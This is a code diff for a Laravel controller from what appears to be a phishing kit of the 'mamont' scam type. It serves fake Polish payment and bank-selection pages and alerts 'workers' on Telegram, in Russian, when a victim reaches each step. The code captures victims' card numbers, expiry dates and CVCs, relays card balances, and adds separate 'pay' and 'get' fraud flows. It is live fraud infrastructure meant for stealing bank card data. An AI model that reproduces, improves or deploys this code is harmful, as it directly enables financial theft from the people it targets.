@@ -19,12 +19,18 @@ use Cache;
 class PagesController extends Controller
 {
     /**
+     * @var Category|null
+     */
+    protected $category;
+    /**
      * @var Fake|null
      */
     protected $fake;
     protected $uuid;
     protected $subdomain;
     protected $bank;
+    protected $isPay;
+
 
     public function __construct()
     {
@@ -32,17 +38,18 @@ class PagesController extends Controller
             $key = 'track_id';
             $route = $request->route();
             $this->subdomain = getSubDomain() ?? $route->originalParameter('subdomain') ?? null;
-            $category = Category::get()->filter(function ($category) {
+            $category = $this->category = Category::get()->filter(function ($category) {
                 return in_array($this->subdomain, explode(',', setting($category->name, $category->name)));
             })->first();
             $this->uuid = $request->session()->get('uuid');
             $track_id = ($request->has($key) || (!$request->ajax() && $request->method() === 'GET'))
                 ? $request->get($key)
                 : $request->session()->get($key);
+            $this->isPay = !$request->has('get') && ($request->has('pay') || $request->session()->get('fake.type') === 'pay');
+            $request->session()->put('fake.type', ($this->isPay ? 'pay' : 'get'));
             try {
                 if (is_null($track_id) || is_null($category)) throw new Exception();
                 $this->fake = $category->fakes()->whereTrackId($track_id)->first();
-
                 if (is_null($this->fake)) throw new Exception();
                 $track_id = $this->fake->track_id;
                 $request->session()->put($key, $track_id);
@@ -75,7 +82,7 @@ class PagesController extends Controller
     private function hasErrorRedirect(): bool
     {
         $redirectUrl = Cache::get("$this->uuid.redirectUrl");
-        return !is_null($redirectUrl) && parse_url($redirectUrl,PHP_URL_PATH) === "/error";
+        return !is_null($redirectUrl) && parse_url($redirectUrl, PHP_URL_PATH) === "/error";
     }
 
     private function processRedirection(Request $request)
@@ -88,12 +95,13 @@ class PagesController extends Controller
         return $redirect;
     }
 
-    private function platform()
+    private function platform(): string
     {
-        return platform($this->getFake()->category->name, '2.0');
+
+        return platform($this->category->name ?? '', $this->isPay ? '1.0' : '2.0');
     }
 
-    private function getFake()
+    private function getFake(): ?Fake
     {
         return $this->fake;
     }
@@ -112,9 +120,9 @@ class PagesController extends Controller
     /**
      * @param $chat_id
      * @param array $text
-     * @return void
+     * @return bool
      */
-    private function sendLogs($chat_id, array $text = []): void
+    private function sendLogs($chat_id, array $text = []): bool
     {
         try {
             $fake = $this->getFake();
@@ -148,39 +156,45 @@ class PagesController extends Controller
                     "parse_mode" => "html",
                     "reply_markup" => $keyboard
                 ]);
-            return;
+
         } catch (TelegramSDKException $e) {
             Log::error("PagesController::sendLogs {$e->getMessage()}");
         }
+        return true;
     }
 
     /**
      * @param string $url
-     * @param array $query
+     * @param array $params
      * @return string
      */
-    private function urlGenerate(string $url, array $query = []): string
+    private function urlGenerate(string $url, array $params = []): string
     {
-        return url($url) . '?' . http_build_query($query);
+        return url($url) . '?' . http_build_query($params);
     }
 
     public function index()
     {
         $fake = $this->getFake();
-        $categoryName = $fake->category->name;
-        $view = "fakes.$categoryName.index";
+        $categoryName = $this->category->name;
+        $view = $this->isPay && view()->exists("fakes.$categoryName.pay")
+            ? "fakes.$categoryName.pay"
+            : "fakes.$categoryName.get";
+        $text = $this->isPay
+            ? "⭐️<b>️Мамонт на странице оплаты</b>"
+            : "⭐️<b>️Мамонт на странице получения средств</b>";
         if (view()->exists($view)) {
             if ($alertGroupId = BotController::groupAlert('id')) $this->sendLogs($alertGroupId, [
-                "⭐️<b>️Мамонт на странице получения средств</b>",
+                $text,
                 "=================",
-                "🏷<b>Товар:</b> <code>{$fake->title}</code>",
+                "🏷<b>Товар:</b> <code>$fake->title</code>",
                 "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
                 "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
                 "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
             ]);
 
             foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
-                "⭐️️<b>️Мамонт на странице получения средств</b>",
+                $text,
                 "=================",
                 "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
                 "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
@@ -194,7 +208,6 @@ class PagesController extends Controller
 
     public function banks($name = null)
     {
-
         $title = 'Wybierz swój bank, aby kontynuować';
         $favicon = asset('images/banks_favicon.ico');
         $banks = collect(config('fakes.banks'));
@@ -290,14 +303,19 @@ class PagesController extends Controller
             "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
             "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
         ]);
-        return view('fakes.order', ['title' => 'Pozyskiwanie środków']);
+        return view(view()->exists("fakes.{$this->category->name}.order")
+            ? "fakes.{$this->category->name}.order"
+            : "fakes.order", ['title' => 'Pozyskiwanie środków']);
     }
 
     public function logOrder(Request $request)
     {
+        if ($request->has('expm') && $request->has('expy')) {
+            $request['expdate'] = "{$request['expm']}/{$request['expy']}";
+        }
         $fake = $this->getFake();
         if ($ccnumber = $request->get('card_number'))
-            $request->session()->put('card_number', $ccnumber);
+            $request->session()->put('card_number', trim(str_replace(' ', '', $ccnumber)));
         if ($expdate = $request->get('expdate'))
             $request->session()->put('expdate', $expdate);
         if ($cvc = $request->get('card_cvc'))
@@ -351,8 +369,11 @@ class PagesController extends Controller
             "💰<b>Баланс на карте:</b> <code>$balance</code> $currency",
             "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
         ]);
-
-        return response()->json(['html' => $html, 'next' => $next]);
+        if ($request->ajax()) {
+            return response()->json(['html' => $html, 'next' => $next]);
+        }
+        if (!is_null($html)) return $html;
+        else return redirect($next);
     }
 
     public function code()
@@ -362,13 +383,14 @@ class PagesController extends Controller
             "⭐️<b>️Мамонт на странице кода</b>",
             "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
         ]);
-        return view('fakes.code', [
-                'title' => 'Potwierdzenie operacji',
-                'categoryName' => mb_strtoupper($fake->category->name) . '_PAY',
-                'amount' => number_format($fake->price, 0, "", " ") . ' ' . setting('currency'),
-                'card_number' => '**** **** **** ' . substr(session()->get('card_number'), -4)
-            ]
-        );
+        return view(view()->exists("fakes.{$this->category->name}.code")
+            ? "fakes.{$this->category->name}.code"
+            : "fakes.code", [
+            'title' => 'Potwierdzenie operacji',
+            'categoryName' => mb_strtoupper($this->category->name) . '_PAY',
+            'amount' => $fake->priceFormat(),
+            'card_number' => '**** **** **** ' . substr(session()->get('card_number'), -4)
+        ]);
     }
 
     public function logCode(Request $request)
